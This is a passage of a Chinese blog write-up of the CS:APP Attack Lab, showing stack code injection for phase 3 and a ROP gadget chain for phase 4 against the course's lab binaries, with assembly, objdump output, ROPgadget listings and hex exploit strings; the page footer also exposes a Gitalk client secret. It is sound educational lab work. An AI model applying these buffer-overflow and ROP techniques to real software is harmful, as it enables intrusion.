+<h3 id="CI-phase-3"><a href="#CI-phase-3" class="headerlink" title="CI(phase 3)"></a>CI(phase 3)</h3><p>分析touch3的代码可以发现，touch3与touch2类似，仍旧是需要将cookie作为参数传递进去，但不同之处在于，touch2的参数类型为unsigned int，因此直接传递cookie本身即可，但touch3的参数类型为char *，需要将一个地址作为参数传递，而且touch3中进行的是字符串比较，而非数字类型的比较，所以还需要将cookie转换为对应的ascii码。</p>
+<p>目前需要做的是：</p>
+<ul>
+<li>将cookie放进内存，这一步通过输入字符串即可将cookie放到栈上</li>
+<li>将cookie的地址放进rdi，然后调用touch3</li>
+<li>覆盖getbuf的返回地址</li>
+</ul>
+<p>整理目前的条件：</p>
+<ul>
+<li>栈可执行</li>
+<li>栈地址固定</li>
+<li>并且在刚刚的phase 2成功完成了一次代码注入</li>
+</ul>
+<p>因此，最先想到的方法就是参考phase 2，注入代码操控rdi，写出注入代码：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pushw $0x6166</span><br><span class="line">pushw $0x3739</span><br><span class="line">pushw $0x3962</span><br><span class="line">pushw $0x3935</span><br><span class="line">mov %rsp, %rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>编译后反汇编查看相应指令的十六进制表示：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost target1]# objdump -d attack3.o </span><br><span class="line"></span><br><span class="line">attack3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	66 68 66 61          	pushw  $0x6166</span><br><span class="line">   4:	66 68 39 37          	pushw  $0x3739</span><br><span class="line">   8:	66 68 62 39          	pushw  $0x3962</span><br><span class="line">   c:	66 68 35 39          	pushw  $0x3935</span><br><span class="line">  10:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  13:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">  18:	c3                   	retq</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>得到最终的输入：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">66 68 66 61 66 68 39 37</span><br><span class="line">66 68 62 39 66 68 35 39</span><br><span class="line">48 89 e7 68 fa 18 40 00 </span><br><span class="line">c3 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>执行：</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208091801966.png" alt="image-20220809180142844"></h1><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP(phase 4)"></a>ROP(phase 4)</h3><p>​    这次的实验目标与phase 2相同，也是要调用touch2。不同之处在于，这次的目标程序rtarget被编译为随机栈地址和栈不可执行，因此之前CI的攻击方法失效，需要另找方法实现。其实这里的要求就是ROP的方法实现。</p>
+<p>​    回忆一下为了调用touch2，需要做的事情：</p>
+<ul>
+<li><p>输入cookie</p>
+</li>
+<li><p>将cookie从栈上放入rdi</p>
+</li>
+<li><p>覆盖栈上的返回地址</p>
+</li>
+</ul>
+<p>由于无法注入代码，那么为了操控寄存器，只能利用已有的指令，提示已经明确指出攻击所需要用到的gadgets都在start_farm和end_farm之间，因此可以看一下这个范围里的指令有哪些，这里我们借助工具（ROPgadget， 地址<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget.git%EF%BC%89%E7%9C%8B%E4%B8%80%E4%B8%8B%EF%BC%88%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E6%98%BE%E7%A4%BA%E7%9A%84%E6%8C%87%E4%BB%A4%E6%98%AFintel%E6%A0%BC%E5%BC%8F%E7%9A%84%EF%BC%89%EF%BC%9A">https://github.com/JonathanSalwan/ROPgadget.git）看一下（注意这里显示的指令是intel格式的）：</a></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">[root@VM target1]# ROPgadget --binary ./rtarget --range 0x401994-0x401ab2|grep -E &#x27;mov|pop&#x27;</span><br><span class="line">0x0000000000401998 : add bl, al ; mov eax, 0x909078fb ; ret</span><br><span class="line">0x0000000000401996 : add byte ptr [rax], al ; add bl, al ; mov eax, 0x909078fb ; ret</span><br><span class="line">0x0000000000401a8f : cmp al, 0xc3 ; mov eax, 0xc020ce88 ; ret</span><br><span class="line">0x0000000000401a6c : fcmovnb st(0), st(3) ; mov dword ptr [rdi], 0xc391d189 ; ret</span><br><span class="line">0x00000000004019f4 : fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret</span><br><span class="line">0x0000000000401a31 : fcmovnb st(0), st(3) ; mov eax, 0xc938d189 ; ret</span><br><span class="line">0x0000000000401a08 : loopne 0x4019cd ; mov dword ptr [rdi], 0xc908c288 ; ret</span><br><span class="line">0x0000000000401a92 : mov dh, cl ; and al, al ; ret</span><br><span class="line">0x0000000000401a0c : mov dl, al ; or cl, cl ; ret</span><br><span class="line">0x00000000004019e1 : mov dword ptr [rdi], 0x9090d199 ; ret</span><br><span class="line">0x00000000004019c3 : mov dword ptr [rdi], 0x90c78948 ; ret</span><br><span class="line">0x0000000000401aab : mov dword ptr [rdi], 0x90e08948 ; ret</span><br><span class="line">0x0000000000401a5a : mov dword ptr [rdi], 0x91e08948 ; ret</span><br><span class="line">0x00000000004019b5 : mov dword ptr [rdi], 0x9258c254 ; ret</span><br><span class="line">0x00000000004019fc : mov dword ptr [rdi], 0xc084d181 ; ret</span><br><span class="line">0x0000000000401a97 : mov dword ptr [rdi], 0xc2e08948 ; ret</span><br><span class="line">0x0000000000401a6e : mov dword ptr [rdi], 0xc391d189 ; ret</span><br><span class="line">0x00000000004019bc : mov dword ptr [rdi], 0xc78d4863 ; ret</span><br><span class="line">0x00000000004019ae : mov dword ptr [rdi], 0xc7c78948 ; ret</span><br><span class="line">0x0000000000401a0a : mov dword ptr [rdi], 0xc908c288 ; ret</span><br><span class="line">0x0000000000401a7c : mov dword ptr [rdi], 0xc908ce09 ; ret</span><br><span class="line">0x0000000000401a75 : mov dword ptr [rdi], 0xd238c281 ; ret</span><br><span class="line">0x0000000000401a2c : mov dword ptr [rdi], 0xdb08ce81 ; ret</span><br><span class="line">0x000000000040199a : mov eax, 0x909078fb ; ret</span><br><span class="line">0x00000000004019db : mov eax, 0x90c2895c ; ret</span><br><span class="line">0x0000000000401a91 : mov eax, 0xc020ce88 ; ret</span><br><span class="line">0x00000000004019f6 : mov eax, 0xc048d189 ; ret</span><br><span class="line">0x0000000000401a18 : mov eax, 0xc1e08948 ; ret</span><br><span class="line">0x00000000004019ca : mov eax, 0xc3905829 ; ret</span><br><span class="line">0x0000000000401a33 : mov eax, 0xc938d189 ; ret</span><br><span class="line">0x0000000000401a54 : mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x0000000000401a4e : mov eax, 0xd208d199 ; ret</span><br><span class="line">0x0000000000401aa5 : mov eax, 0xd220ce8d ; ret</span><br><span class="line">0x0000000000401a68 : mov eax, 0xdb08d189 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a86 : mov eax, esp ; nop ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x0000000000401a5d : mov eax, esp ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019a4 : mov ebx, 0x51878dc3 ; jae 0x401a04 ; nop ; ret</span><br><span class="line">0x00000000004019b3 : mov ebx, 0xc25407c7 ; pop rax ; xchg edx, eax ; ret</span><br><span class="line">0x0000000000401a34 : mov ecx, edx ; cmp cl, cl ; ret</span><br><span class="line">0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret</span><br><span class="line">0x0000000000401a70 : mov ecx, edx ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019b2 : mov edi, 0x5407c7c3 ; ret 0x9258</span><br><span class="line">0x00000000004019c6 : mov edi, eax ; nop ; ret</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x0000000000401a20 : mov edx, eax ; add cl, cl ; ret</span><br><span class="line">0x00000000004019dd : mov edx, eax ; nop ; ret</span><br><span class="line">0x0000000000401a42 : mov edx, eax ; test al, al ; ret</span><br><span class="line">0x0000000000401a27 : mov esi, ecx ; cmp al, al ; ret</span><br><span class="line">0x00000000004019ea : mov esi, ecx ; js 0x4019b7 ; ret</span><br><span class="line">0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret</span><br><span class="line">0x0000000000401a63 : mov esi, ecx ; xchg edx, eax ; ret</span><br><span class="line">0x0000000000401aad : mov rax, rsp ; nop ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x0000000000401a99 : mov rax, rsp ; ret 0x8dc3</span><br><span class="line">0x0000000000401a5c : mov rax, rsp ; xchg ecx, eax ; ret</span><br><span class="line">0x00000000004019c5 : mov rdi, rax ; nop ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x00000000004019ab : pop rax ; nop ; ret</span><br><span class="line">0x00000000004019b9 : pop rax ; xchg edx, eax ; ret</span><br><span class="line">0x00000000004019dc : pop rsp ; mov edx, eax ; nop ; ret</span><br><span class="line">0x0000000000401a01 : rol bl, 0x8d ; xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret</span><br><span class="line">0x0000000000401aa9 : rol bl, cl ; mov dword ptr [rdi], 0x90e08948 ; ret</span><br><span class="line">0x0000000000401a7a : rol bl, cl ; mov dword ptr [rdi], 0xc908ce09 ; ret</span><br><span class="line">0x0000000000401a52 : rol bl, cl ; mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x0000000000401aa3 : rol bl, cl ; mov eax, 0xd220ce8d ; ret</span><br><span class="line">0x0000000000401a50 : ror dword ptr [rax], 1 ; rol bl, cl ; mov eax, 0xc9c4c289 ; ret</span><br><span class="line">0x00000000004019f2 : shl dword ptr [rax], 1 ; fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret</span><br><span class="line">0x0000000000401a84 : xchg dword ptr [rax], ecx ; mov eax, esp ; nop ; ret</span><br><span class="line">0x0000000000401a04 : xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret</span><br><span class="line">0x00000000004019a8 : xchg dword ptr [rcx + 0x73], edx ; pop rax ; nop ; ret</span><br><span class="line">0x0000000000401a3a : xchg eax, ecx ; mov eax, esp ; ret</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>这里可以看到0x4019ab和0x4019a2处分别是pop和mov指令，并且可以操作rdi，所以可以考虑利用这两处指令完成操作。</p>
+<p>梳理调用逻辑，这里需要的是：</p>
+<ul>
+<li>cookie入栈</li>
+<li>执行pop，cookie存入rax</li>
+<li>执行mov，cookie存入rdi</li>
+<li>调用touch2</li>
+</ul>
+<p>最后得到输入串：</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        示例代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+    </div>
+</div>
+
+<p>攻击效果：</p>
+<p><img src="https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220814203251.png" alt="image-20220814203244469"></p>
+<h3 id="ROP-phase-5"><a href="#ROP-phase-5" class="headerlink" title="ROP(phase 5)"></a>ROP(phase 5)</h3><p>（暂未完成）</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/104340864">Introduction to CSAPP（二十）：这可能是你能找到的最具捷径的attacklab了</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36894564/article/details/72863319">CSAPP：Attack Lab —— 缓冲区溢出攻击实验</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.superweb999.com/article/1005924.html">64位linux系统：栈溢出+ret2libc ROP attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/buffer-overflow-3.md">缓冲区溢出：攻防对抗</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257238.htm">rop链攻击原理与思路(x86/x64)</a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CSAPP/" rel="tag"># CSAPP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/IT/%E7%BD%91%E7%BB%9C/socket%E4%B8%ADbacklog%E7%9A%84%E5%90%AB%E4%B9%89%E5%8F%8A%E5%BD%B1%E5%93%8D.html" rel="prev" title="socket中backlog的含义及影响">
+      <i class="fa fa-chevron-left"></i> socket中backlog的含义及影响
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/IT/Kubernetes/kubelet%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98.html" rel="next" title="kubelet启动问题">
+      kubelet启动问题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+      <div class="comment-button-group">
+          <a class="btn comment-button gitalk">gitalk(github评论)</a>
+          <a class="btn comment-button valine">匿名评论(Anonymous)</a>
+      </div>
+        <div class="comment-position gitalk">
+          <div class="comments" id="gitalk-container"></div>
+        </div>
+        <div class="comment-position valine">
+          <div class="comments" id="valine-comments"></div>
+        </div>
+      <script>
+        (function() {
+          let commentButton = document.querySelectorAll('.comment-button');
+            commentButton.forEach(element => {
+            let commentClass = element.classList[2];
+            element.addEventListener('click', () => {
+              commentButton.forEach(rmActive => rmActive.classList.remove('active'));
+              element.classList.add('active');
+              document.querySelectorAll('.comment-position').forEach(rmActive => rmActive.classList.remove('active'));
+              document.querySelector(`.comment-position.${commentClass}`).classList.add('active');
+              if (CONFIG.comments.storage) {
+                localStorage.setItem('comments_active', commentClass);
+              }
+            });
+          });
+          let { activeClass } = CONFIG.comments;
+          if (CONFIG.comments.storage) {
+            activeClass = localStorage.getItem('comments_active') || activeClass;
+          }
+          if (activeClass) {
+            let activeButton = document.querySelector(`.comment-button.${activeClass}`);
+            if (activeButton) {
+              activeButton.click();
+            }
+          }
+        })();
+      </script>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.2.</span> <span class="nav-text">文件介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E8%AF%B4%E6%98%8E"><span class="nav-number">1.3.</span> <span class="nav-text">程序说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="nav-number">2.</span> <span class="nav-text">实验目标</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Part-1-Code-Injection-Attacks"><span class="nav-number">2.1.</span> <span class="nav-text">Part 1: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-1%EF%BC%9Agetbuf%E6%89%A7%E8%A1%8C%E5%90%8E%E5%8E%BB%E8%B0%83%E7%94%A8touch1%EF%BC%8C%E8%80%8C%E4%B8%8D%E5%86%8D%E6%98%AF%E8%BF%94%E5%9B%9Etest%EF%BC%9B"><span class="nav-number">2.1.1.</span> <span class="nav-text">Phase 1：getbuf执行后去调用touch1，而不再是返回test；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase2-getbuf%E6%89%A7%E8%A1%8C%E5%90%8E%E5%8E%BB%E8%B0%83%E7%94%A8touch2"><span class="nav-number">2.1.2.</span> <span class="nav-text">Phase2: getbuf执行后去调用touch2;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-3-getbuf%E6%89%A7%E8%A1%8C%E5%90%8E%E5%8E%BB%E8%B0%83%E7%94%A8touch3"><span class="nav-number">2.1.3.</span> <span class="nav-text">Phase 3:  getbuf执行后去调用touch3;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part-2%EF%BC%9A-Return-Oriented-Programming"><span class="nav-number">2.2.</span> <span class="nav-text">Part 2： Return-Oriented Programming</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-4-getbuf%E6%89%A7%E8%A1%8C%E5%90%8E%E5%8E%BB%E8%B0%83%E7%94%A8touch2"><span class="nav-number">2.2.1.</span> <span class="nav-text">Phase 4: getbuf执行后去调用touch2;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-5-getbuf%E6%89%A7%E8%A1%8C%E5%90%8E%E5%8E%BB%E8%B0%83%E7%94%A8touch3"><span class="nav-number">2.2.2.</span> <span class="nav-text">Phase 5: getbuf执行后去调用touch3;</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CI-phase-1"><span class="nav-number">3.1.</span> <span class="nav-text">CI(phase 1)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CI-phase-2"><span class="nav-number">3.2.</span> <span class="nav-text">CI(phase 2)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CI-phase-3"><span class="nav-number">3.3.</span> <span class="nav-text">CI(phase 3)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number"></span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-phase-4"><span class="nav-number">0.1.</span> <span class="nav-text">ROP(phase 4)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-phase-5"><span class="nav-number">0.2.</span> <span class="nav-text">ROP(phase 5)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">abug0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-book-open"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">abug0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">265k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:01</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-6105212924a623f6" async="async"></script>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '40ec7d9233a147cef660',
+      clientSecret: '414cf059b7655d5e8a124b78961ca81378149a03',
+      repo        : 'gitalk-comments',
+      owner       : 'abug0',
+      admin       : ['abug0'],
+      id          : 'ce1b7ce9a3a6f887f9b7046ecf491cd0',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'DkAmD8PHRf2jESEBV3Ght5TX-gzGzoHsz',
+      appKey     : 'OTTHxhSv4aPOg8I21witBRTh',
+      placeholder: "请在此留言",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
